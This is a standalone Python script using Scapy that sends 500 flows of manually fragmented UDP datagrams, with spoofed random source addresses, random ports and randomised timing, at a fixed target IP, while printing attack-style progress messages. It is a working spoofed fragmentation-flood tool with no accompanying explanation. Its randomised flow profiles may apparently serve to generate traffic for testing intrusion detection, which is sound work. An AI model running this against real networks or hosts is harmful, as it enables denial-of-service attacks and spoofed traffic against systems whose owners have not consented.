from scapy.all import *
import random
import time
import struct

TARGET_IP = "192.168.1.1"
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting UDP Fragmentation -> {TARGET_IP}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    src_ip  = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    sport   = random.randint(1024, 65535)
    dport   = random.randint(1, 65535)
    ttl     = random.randint(32, 128)
    packets = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow payload size profile
    size_min = random.randint(300, 600)
    size_max = random.randint(size_min + 200, 3000)

    # Per-flow IAT profile
    iat_min = random.uniform(0.0001, 0.005)
    iat_max = random.uniform(iat_min + 0.001, 0.05)

    # Per-flow fragment size — randomized, must be multiple of 8
    raw_frag  = random.randint(48, 512)
    frag_size = (raw_frag // 8) * 8        # enforce multiple-of-8 rule
    frag_size = max(frag_size, 8)          # minimum 8 bytes

    for p in range(packets):
        # New IP ID per datagram (not per flow) — ties fragments of same datagram
        pkt_id = random.randint(1, 65535)

        # Full payload for this datagram
        payload_size = random.randint(size_min, size_max)
        full_payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

        # Manual UDP header (8 bytes) — needed because Scapy won't add it to raw fragments
        udp_len    = 8 + len(full_payload)
        udp_header = struct.pack("!HHHH",
            sport,       # source port
            dport,       # destination port
            udp_len,     # total UDP length
            0            # checksum (disabled)
        )
        udp_data = udp_header + full_payload

        # Fragment and send
        offset = 0
        frags  = []
        while offset < len(udp_data):
            chunk   = udp_data[offset: offset + frag_size]
            is_last = (offset + frag_size) >= len(udp_data)

            frag_pkt = IP(
                src   = src_ip,
                dst   = TARGET_IP,
                ttl   = ttl,
                id    = pkt_id,            # shared across fragments of this datagram
                proto = 17,                # UDP
                flags = 0 if is_last else 1,  # MF flag
                frag  = offset // 8        # offset in 8-byte units
            ) / Raw(load=chunk)

            frags.append(frag_pkt)
            offset += frag_size

        for frag in frags:
            send(frag, verbose=0)
            time.sleep(random.uniform(iat_min, iat_max))

        time.sleep(random.uniform(0.005, 0.02))  # gap between datagrams

    time.sleep(random.uniform(0.01, 0.05))       # gap between flows

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")